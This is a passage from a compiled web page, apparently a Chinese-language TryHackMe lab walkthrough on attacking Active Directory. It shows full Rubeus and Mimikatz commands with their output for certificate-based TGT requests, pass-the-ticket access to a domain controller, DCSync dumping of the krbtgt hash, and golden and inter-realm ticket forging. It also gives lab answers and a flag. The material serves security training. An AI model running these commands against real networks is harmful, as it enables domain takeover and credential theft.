3b0\u5728\u6211\u4eec\u7ec8\u4e8e\u53ef\u4ee5\u6a21\u4eff\u4e00\u4e2a\u7528\u6237\u4e86\u3002\u4e3a\u4e86\u5b8c\u6210\u8fd9\u4e2a\u64cd\u4f5c\uff0c\u9700\u8981\u4e24\u4e2a\u6b65\u9aa4\uff1a"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:"\u4f7f\u7528\u8bc1\u4e66\u8bf7\u6c42 Kerberos \u7968\u636e\u6388\u6743\u7968\u636e\uff08TGT\uff09\u3002"}),"\n",(0,r.jsx)(n.li,{children:"\u5c06 Kerberos TGT \u52a0\u8f7d\u5230\u4f60\u9009\u62e9\u7684\u9ed1\u5ba2\u5e73\u53f0\u4e2d\u3002"}),"\n"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5bf9\u4e8e\u7b2c\u4e00\u6b65\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 Rubeus\u3002\u5df2\u7ecf\u7f16\u8bd1\u597d\u7684\u7248\u672c\u53ef\u4ee5\u5728 ",(0,r.jsx)(n.code,{children:"C:\\Tools\\"})," \u76ee\u5f55\u4e0b\u627e\u5230\u3002\u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u7a97\u53e3\u5e76\u5bfc\u822a\u5230\u8fd9\u4e2a\u76ee\u5f55\u3002\u6211\u4eec\u5c06\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u8bf7\u6c42 TGT\uff1a"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u8ba9\u6211\u4eec\u5206\u89e3\u4e00\u4e0b\u8fd9\u4e9b\u53c2\u6570\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"/user - \u6307\u5b9a\u6211\u4eec\u5c06\u8981\u6a21\u4eff\u7684\u7528\u6237\uff0c\u5fc5\u987b\u4e0e\u6211\u4eec\u751f\u6210\u8bc1\u4e66\u7684 UPN \u5339\u914d\u3002"}),"\n",(0,r.jsx)(n.li,{children:"/enctype - \u6307\u5b9a\u7968\u636e\u7684\u52a0\u5bc6\u7c7b\u578b\u3002\u8bbe\u7f6e\u8fd9\u4e2a\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u9ed8\u8ba4\u7684\u52a0\u5bc6\u7b97\u6cd5\u8f83\u5f31\uff0c\u4f1a\u5bfc\u81f4\u8d85\u8d8a\u54c8\u5e0c\u8b66\u62a5\u3002"}),"\n",(0,r.jsx)(n.li,{children:"/certificate - \u6307\u5411\u6211\u4eec\u751f\u6210\u7684\u8bc1\u4e66\u7684\u8def\u5f84\u3002"}),"\n",(0,r.jsx)(n.li,{children:"/password - \u6211\u4eec\u8bc1\u4e66\u6587\u4ef6\u7684\u5bc6\u7801\u3002"}),"\n",(0,r.jsx)(n.li,{children:"/outfile - \u5b58\u50a8\u6211\u4eec\u7684 TGT \u7684\u6587\u4ef6\u8def\u5f84\u3002"}),"\n",(0,r.jsx)(n.li,{children:"/domain - \u6211\u4eec\u5f53\u524d\u653b\u51fb\u7684\u57df\u7684\u5b8c\u5168\u9650\u5b9a\u57df\u540d\uff08FQDN\uff09\u3002"}),"\n",(0,r.jsx)(n.li,{children:"/dc - \u6211\u4eec\u4ece\u4e2d\u8bf7\u6c42 TGT \u7684\u57df\u63a7\u5236\u5668\u7684 IP \u5730\u5740\u3002\u901a\u5e38\u6700\u597d\u9009\u62e9\u4e00\u4e2a\u8fd0\u884c CA \u670d\u52a1\u7684 DC\u3002"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u4e00\u65e6\u6267\u884c\u547d\u4ee4\uff0c\u6211\u4eec\u5e94\u8be5\u4f1a\u6536\u5230\u6211\u4eec\u7684 TGT\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="TGT Request"',children:"C:\\THMTools> .\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101\n          ______        _\n         (_____ \\      | |\n          _____) )_   _| |__  _____ _   _  ___\n         |  __  /| | | |  _ \\| ___ | | | |/___)\n         | |  \\ \\| |_| | |_) ) ____| |_| |___ |\n         |_|   |_|____/|____/|_____)____/(___/\n\n         v2.0.0\n\n       [*] Action: Ask TGT\n\n       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert\n       [*] Building AS-REQ (w/ PKINIT preauth) for: 'lunar.eruca.com\\svc.gitlab'\n       [+] TGT request successful!\n       [*] base64(ticket.kirbi):\n\n             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\n\n         ServiceName              :  krbtgt/za.tryhackme.loc\n         ServiceRealm             : ZA.TRYHACKME.LOC\n         UserName                 : Adminsitrator\n         UserRealm                : ZA.TRYHACKME.LOC\n         StartTime                :  2/6/2022 5:54:46 PM\n         EndTime                  :  2/7/2022 3:54:46 AM\n         RenewTill                :  2/13/2022 5:54:46 PM\n         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable\n         KeyType                  :  aes256_cts_hmac_sha1\n         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=\n         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Mimikatz \u6765\u52a0\u8f7d TGT \u5e76\u8ba4\u8bc1\u5230 THMDC\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Powershell"',children:"C:\\Tools>mimikatz_trunk\\x64\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com)\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # kerberos::ptt administrator.kirbi\n\n* File: 'administrator.kirbi': OK\n\nmimikatz # exit\nBye!\n\nC:\\Tools>dir \\\\THMDC.za.tryhackme.loc\\c$\\\n Volume in drive \\\\THMDC.za.tryhackme.loc\\c$ is Windows\n Volume Serial Number is 1634-22A9\n\n Directory of \\\\THMDC.za.tryhackme.loc\\c$\n\n01/04/2022  08:47 AM               103 delete-vagrant-user.ps1\n04/30/2022  10:24 AM               154 dns_entries.csv\n04/27/2022  10:53 PM           885,468 MzIzMzViM2ItMmQ2Zi00YWQ3LWEwNjEtYjg2MmFjNzViY2Ix.bin\n09/15/2018  08:19 AM    <DIR>          PerfLogs\n03/21/2020  09:31 PM    <DIR>          Program Files\n03/21/2020  09:28 PM    <DIR>          Program Files (x86)\n04/27/2022  08:27 AM             1,423 thm-network-setup-dc.ps1\n04/25/2022  07:13 PM    <DIR>          tmp\n04/27/2022  08:22 AM    <DIR>          Users\n04/25/2022  07:11 PM    <SYMLINKD>     vagrant [\\\\vboxsvr\\vagrant]\n04/27/2022  08:12 PM    <DIR>          Windows\n               7 File(s)      2,356,811 bytes\n               7 Dir(s)  50,914,541,568 bytes free\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u6700\u7ec8\uff0c\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u96f6\u7ea7\u57fa\u7840\u8bbe\u65bd\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u5e76\u4e14\u6210\u529f\u5165\u4fb5\u4e86\u6574\u4e2a\u5b50\u57df\uff01"}),"\n",(0,r.jsxs)(n.admonition,{title:"Answer the questions below",type:"info",children:[(0,r.jsx)(n.p,{children:"\u7528\u6237\u521b\u5efa\u4ec0\u4e48\u6765\u5411 CA \u8bf7\u6c42\u8bc1\u4e66\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Certificate signing request\n"})}),(0,r.jsx)(n.p,{children:"\u5fae\u8f6f\u7684 PKI \u5b9e\u73b0\u540d\u79f0\u662f\u4ec0\u4e48\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"Active Directory Certificate Services\n"})}),(0,r.jsx)(n.p,{children:"\u5b58\u50a8\u5728\u7ba1\u7406\u5458\u684c\u9762\u76ee\u5f55 THMDC \u4e0a\u7684\u6807\u5fd7\u7684\u503c\u662f\u591a\u5c11 (flag5.txt)\uff1f"}),(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"THM{AD.Certs.Can.Get.You.DA}\n"})})]}),"\n",(0,r.jsx)(n.h2,{id:"exploiting-domain-trusts---\u5229\u7528\u57df\u4fe1\u4efb",children:"Exploiting Domain Trusts - \u5229\u7528\u57df\u4fe1\u4efb"}),"\n",(0,r.jsx)(n.p,{children:"\u867d\u7136\u6211\u4eec\u5df2\u7ecf\u8bbf\u95ee\u4e86 Tier 0 \u8bbe\u65bd\uff0c\u4f46\u8fd9\u8fd8\u4e0d\u591f\u3002\u6211\u4eec\u53ea\u662f\u5229\u7528\u4e86 ZA.TRYHACKME.LOC \u57df\u3002\u80af\u5b9a TRYHACKME \u8fd8\u6709\u5176\u4ed6\u5730\u533a\u7684\u57df\uff0c\u5bf9\u5427\uff1f\u5982\u679c\u6211\u4eec\u63a7\u5236\u4e86\u6839\u57df TRYHACKME.LOC\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u63a7\u5236\u6240\u6709\u8fd9\u4e9b\u5730\u533a\u57df\u3002\u5728\u8fd9\u4e2a\u4efb\u52a1\u4e2d\uff0c\u6211\u4eec\u5c06\u770b\u770b\u5982\u4f55\u5229\u7528\u57df\u4fe1\u4efb\u6765\u63a7\u5236\u6574\u4e2a\u6797\u533a\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"\u57df\u4fe1\u4efb",children:"\u57df\u4fe1\u4efb"}),"\n",(0,r.jsx)(n.p,{children:"\u6b63\u5982\u5728 AD \u57fa\u7840\u77e5\u8bc6\u623f\u95f4\u4e2d\u8ba8\u8bba\u7684\u90a3\u6837\uff0c\u4e00\u4e2a\u68ee\u6797\u662f AD \u7f51\u7edc\u4e2d\u4e00\u4e2a\u6216\u591a\u4e2a\u57df\u6811\u7684\u96c6\u5408\u3002\u57df\u4fe1\u4efb\u662f\u7f51\u7edc\u4e2d\u7528\u6237\u83b7\u53d6\u5bf9\u5176\u4ed6\u8d44\u6e90\u8bbf\u95ee\u6743\u9650\u7684\u673a\u5236\u3002\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\uff0c\u4fe1\u4efb\u5b9a\u4e49\u4e86\u68ee\u6797\u5185\u90e8\u57df\u4e4b\u95f4\u7684\u901a\u4fe1\u65b9\u5f0f\u3002\u5728\u67d0\u4e9b\u73af\u5883\u4e2d\uff0c\u4fe1\u4efb\u53ef\u4ee5\u5ef6\u4f38\u5230\u5916\u90e8\u57df\uff0c\u751a\u81f3\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u8fd8\u53ef\u4ee5\u5ef6\u4f38\u5230\u5176\u4ed6\u68ee\u6797\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u57df\u4e4b\u95f4\u53ef\u4ee5\u914d\u7f6e\u4e24\u79cd\u4e3b\u8981\u7c7b\u578b\u7684\u4fe1\u4efb\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u65b9\u5411\u6027 - \u4fe1\u4efb\u7684\u65b9\u5411\u4ece\u4e00\u4e2a\u4fe1\u4efb\u57df\u6d41\u5411\u4e00\u4e2a\u88ab\u4fe1\u4efb\u57df"}),"\n",(0,r.jsx)(n.li,{children:"\u53ef\u4f20\u9012\u6027 - \u4fe1\u4efb\u5173\u7cfb\u6269\u5c55\u5230\u4e0d\u4ec5\u4ec5\u662f\u4e24\u4e2a\u57df\uff0c\u8fd8\u5305\u62ec\u5176\u4ed6\u88ab\u4fe1\u4efb\u7684\u57df"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u4e00\u4e2a\u68ee\u6797\u4e2d\u901a\u5e38\u4f1a\u6709\u4e00\u4e2a\u6839\u6216\u7236\u57df\u3002\u5728\u6211\u4eec\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u662f TRYHACKME.LOC\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u533a\u57df\u529e\u516c\u5ba4\uff0c\u90fd\u4f1a\u521b\u5efa\u5b50\u57df\u6216\u5b50\u57df\uff0c\u6bd4\u5982 ZA.TRYHACKME.LOC \u6216 UK.TRYHACKME.LOC\u3002\u8fd9\u79cd\u68ee\u6797\u914d\u7f6e\u5c06\u5141\u8bb8 ZA \u548c UK \u529e\u516c\u5ba4\u4e4b\u95f4\u5171\u4eab\u8d44\u6e90\u3002\u4f8b\u5982\uff0c\u5982\u679c UK \u529e\u516c\u5ba4\u7684\u67d0\u4e2a\u7528\u6237\u9700\u8981\u8bbf\u95ee THMSERVER1\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a ZA \u57df\u4e2d\u7684\u7528\u6237\u6388\u4e88\u8bbf\u95ee\u6743\u9650\u3002\u8fd9\u79cd\u6743\u9650\u59d4\u6d3e\u53ef\u4ee5\u5de5\u4f5c\uff0c\u56e0\u4e3a ZA \u4e0e\u6839\u57df\u4ee5\u53ca UK \u4e0e\u6839\u57df\u4e4b\u95f4\u5b58\u5728\u53cc\u5411\u4fe1\u4efb\uff0c\u4ece\u6839\u672c\u4e0a\u521b\u5efa\u4e86 ZA \u548c UK \u4e4b\u95f4\u7684\u53ef\u4f20\u9012\u4fe1\u4efb\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u4e0a\u6240\u8ff0\uff0c\u7236\u57df\u548c\u5b50\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\u662f\u53cc\u5411\u7684\u3002\u8fd9\u662f\u9884\u671f\u7684\u884c\u4e3a\uff0c\u5e76\u4e14\u7528\u4e8e\u901a\u8fc7\u66f4\u5927\u7684\u53ef\u4f20\u9012\u4fe1\u4efb\u5173\u7cfb\u5171\u4eab\u8d44\u6e90\u3002\u7136\u800c\uff0c\u4f5c\u4e3a\u653b\u51fb\u8005\uff0c\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u653b\u51fb\u4e86\u5b50\u57df\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u5229\u7528\u8fd9\u79cd\u4fe1\u4efb\u6765\u5a01\u80c1\u5230\u7236\u57df\u3002"}),"\n",(0,r.jsx)(n.h3,{id:"krbtgt-\u548c\u9ec4\u91d1\u7968\u636e",children:"KRBTGT \u548c\u9ec4\u91d1\u7968\u636e"}),"\n",(0,r.jsx)(n.p,{children:"KRBTGT \u662f\u5fae\u8f6f\u5bf9 Kerberos \u7684\u5b9e\u73b0\u6240\u4f7f\u7528\u7684\u8d26\u6237\u3002\u540d\u79f0\u6765\u6e90\u4e8e Kerberos\uff08KRB\uff09\u548c Ticket Granting Ticket\uff08TGT\uff09\u3002\u5b9e\u8d28\u4e0a\uff0c\u8fd9\u4e2a\u8d26\u6237\u5145\u5f53 Kerberos Distribution Center\uff08KDC\uff09\u670d\u52a1\u7684\u670d\u52a1\u8d26\u6237\uff0c\u8be5\u670d\u52a1\u5904\u7406\u6240\u6709 Kerberos \u7968\u8bc1\u8bf7\u6c42\u3002\u8fd9\u4e2a\u8d26\u6237\u7528\u4e8e\u4e3a\u57df\u4e2d\u7684\u6240\u6709 Kerberos \u7968\u8bc1\u52a0\u5bc6\u548c\u7b7e\u540d\u3002\u7531\u4e8e\u5bc6\u7801\u54c8\u5e0c\u7531\u6240\u6709\u57df\u63a7\u5236\u5668\u5171\u4eab\uff0c\u56e0\u6b64\u5b83\u4eec\u53ef\u4ee5\u9a8c\u8bc1\u7528\u6237\u8bf7\u6c42\u8bbf\u95ee\u8d44\u6e90\u65f6\u63a5\u6536\u5230\u7684 TGT \u7684\u771f\u5b9e\u6027\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u800c\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u751f\u6210\u81ea\u5df1\u7684 TGT \u6765\u6388\u4e88\u6211\u4eec\u5bf9\u4e00\u5207\u7684\u8bbf\u95ee\u6743\u9650\u600e\u4e48\u529e\uff1f\u8fd9\u5c31\u662f\u6240\u8c13\u7684 Golden Ticket \u653b\u51fb\u3002\u5728 Golden Ticket \u653b\u51fb\u4e2d\uff0c\u6211\u4eec\u5b8c\u5168\u7ed5\u8fc7\u4e86 KDC\uff0c\u521b\u5efa\u81ea\u5df1\u7684 TGT\uff0c\u672c\u8d28\u4e0a\u6210\u4e3a\u4e86\u4e00\u4e2a Ticket Granting Server\uff08TGS\uff09\u3002\u4e3a\u4e86\u4f2a\u9020 TGT\uff0c\u6211\u4eec\u9700\u8981\u4ee5\u4e0b\u4fe1\u606f\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u57df\u7684 FQDN\uff08\u5b8c\u5168\u9650\u5b9a\u57df\u540d\uff09"}),"\n",(0,r.jsx)(n.li,{children:"\u57df\u7684\u5b89\u5168\u6807\u8bc6\u7b26\uff08SID\uff09"}),"\n",(0,r.jsx)(n.li,{children:"\u6211\u4eec\u60f3\u8981\u5192\u5145\u7684\u8d26\u6237\u7528\u6237\u540d"}),"\n",(0,r.jsx)(n.li,{children:"KRBTGT \u5bc6\u7801\u54c8\u5e0c"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u524d\u4e09\u4e2a\u901a\u5e38\u5f88\u5bb9\u6613\u6062\u590d\u3002\u6700\u540e\u4e00\u4e2a\u9700\u8981\u57df\u88ab\u5a01\u80c1\uff0c\u56e0\u4e3a KRBTGT \u5bc6\u7801\u54c8\u5e0c\u53ea\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u4e0a\u3002\u5e78\u8fd0\u7684\u662f\uff0c\u6211\u4eec\u521a\u521a\u901a\u8fc7\u4f2a\u9020\u8bc1\u4e66\u653b\u51fb\u4e86 Tier 0 \u7ba1\u7406\u5458\u7ec4\uff0c\u6240\u4ee5\u6211\u4eec\u6709\u80fd\u529b\u6062\u590d THMSERVER2 \u4e0a\u7684 KRBTGT \u5bc6\u7801\u54c8\u5e0c\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u6211\u4eec\u5c06\u518d\u6b21\u4f7f\u7528 Mimikatz \u548c DC Sync \u6765\u6062\u590d THMSERVER2 \u4e0a\u7684 KRBTGT \u5bc6\u7801\u54c8\u5e0c\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:"C:\\Tools>mimikatz_trunk\\x64\\mimikatz.exe\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)\n ## \\ / ##       > https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             (vincent.letoux@gmail.com)\n  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz # privilege::debug\nPrivilege '20' OK\n\nmimikatz # lsadump::dcsync /user:za\\krbtgt\n[DC] 'za.tryhackme.loc' will be the domain\n[DC] 'THMDC.za.tryhackme.loc' will be the DC server\n[DC] 'za\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 (USER_OBJECT)\nUser Account Control : 00000202 (ACCOUNTDISABLE NORMAL_ACCOUNT)\nAccount expiration   :\nPassword last change : 4/25/2022 7:18:22 PM\nObject Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: removed\n    ntlm- 0: removed\n    lm  - 0: removed\n[....]\n"})}),"\n",(0,r.jsx)(n.h3,{id:"inter-realm-tgts---\u8de8\u57df-tgt",children:"Inter-Realm TGTs - \u8de8\u57df TGT"}),"\n",(0,r.jsx)(n.p,{children:"\u6293\u53d6 KRBTGT \u5bc6\u7801\u54c8\u5e0c\u540e\uff0c\u6211\u4eec\u73b0\u5728\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2a Golden Ticket \u6765\u8bbf\u95ee\u5b50\u57df\u4e2d\u7684\u4efb\u4f55\u8d44\u6e90\u3002\u8fd9\u4e5f\u5c06\u5728 \u201c\u6301\u7eed AD\u201d \u623f\u95f4\u4e2d\u8fdb\u884c\u66f4\u8be6\u7ec6\u7684\u8ba8\u8bba\u3002\u7136\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4f2a\u9020\u4e00\u4e2a Inter-Realm TGT \u6765\u8fdb\u4e00\u6b65\u64cd\u4f5c\u3002Inter-Realm TGT \u7528\u4e8e\u63d0\u4f9b\u5bf9\u5176\u4ed6\u57df\u4e2d\u8d44\u6e90\u7684\u8bbf\u95ee\u6743\u9650\u3002\u5728\u6211\u4eec\u7684\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u5e0c\u671b\u5229\u7528\u5b50\u57df\u548c\u7236\u57df\u4e4b\u95f4\u7684\u53cc\u5411\u4fe1\u4efb\u5173\u7cfb\uff0c\u4ee5\u83b7\u53d6\u5bf9\u7236\u57df\u7684\u5b8c\u5168\u8bbf\u95ee\u6743\u9650\u3002"}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u6784\u9020 Golden Ticket \u65f6\uff0c\u6211\u4eec\u5c06\u5305\u542b\u6765\u81ea\u5176\u4ed6\u57df\u7684\u989d\u5916\u8d26\u6237 SID\uff0c\u4ee5\u6267\u884c\u6b64\u6f0f\u6d1e\u5229\u7528\u3002Mimikatz \u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\uff0c\u5728 Kerberos TGT \u7684 KERB_VALIDATION_INFO \u7ed3\u6784\u7684 ExtraSids \u90e8\u5206\u4e2d\u8bbe\u7f6e ExtraSids\u3002ExtraSids \u90e8\u5206\u88ab\u63cf\u8ff0\u4e3a \u201c\u6307\u5411\u5305\u542b\u4e0e\u4e3b\u4f53\u6240\u5c5e\u8d26\u6237\u57df\u4e4b\u5916\u7684\u57df\u4e2d\u7ec4\u7684 SID \u5217\u8868\u7684 KERB_SID_AND_ATTRIBUTES \u7ed3\u6784\u5217\u8868\u7684\u6307\u9488\u201d\u3002"}),"\n",(0,r.jsxs)(n.p,{children:["\u5173\u952e\u5728\u4e8e\uff0c\u6211\u4eec\u5c06\u901a\u8fc7\u5728\u6211\u4eec\u4f2a\u9020\u7684\u5b50\u57df\u57df\u63a7\u5236\u5668\u7684\u7968\u8bc1\u4e2d\u6dfb\u52a0 Enterprise Admins\uff08EA\uff09\u7ec4\u7684 SID \u4f5c\u4e3a\u989d\u5916 SID \u6765\u5229\u7528\u7236\u57df\u5bf9\u6211\u4eec\u5b50\u57df\u7684\u4fe1\u4efb\u3002EA \u7ec4\u5c5e\u4e8e\u7236\u57df\uff0c\u52a0\u5165\u8fd9\u4e2a\u7ec4\u57fa\u672c\u4e0a\u6388\u4e88\u4e86\u5bf9\u6574\u4e2a\u68ee\u6797\u7684\u7ba1\u7406\u6743\u9650\uff01\u8be5\u7ec4\u7684\u9ed8\u8ba4 SID \u662f ",(0,r.jsx)(n.code,{children:"S-1-5-21-<RootDomain>-519"})," \u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u5728\u8fdb\u884c\u5229\u7528\u4e4b\u524d\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u6062\u590d\u4e24\u4e2a SID\uff1a"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"\u5b50\u57df\u63a7\u5236\u5668\uff08THMDC\uff09\u7684 SID\uff0c\u6211\u4eec\u5c06\u5728\u6211\u4eec\u4f2a\u9020\u7684 TGT \u4e2d\u5192\u5145"}),"\n",(0,r.jsx)(n.li,{children:"\u7236\u57df\u4e2d Enterprise Admins \u7684 SID\uff0c\u6211\u4eec\u5c06\u4f5c\u4e3a\u4f2a\u9020\u7684 TGT \u7684\u989d\u5916 SID \u6dfb\u52a0"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"\u8981\u6062\u590d\u8fd9\u4e9b SID\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 AD-RSAT Powershell \u547d\u4ee4\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6062\u590d\u5b50\u57df\u63a7\u5236\u5668\u7684 SID\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",metastring:'title="Command Prompt"',children:'PS C:\\> Get-ADComputer -Identity "THMDC"\n\nDistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc\nDNSHostName       : 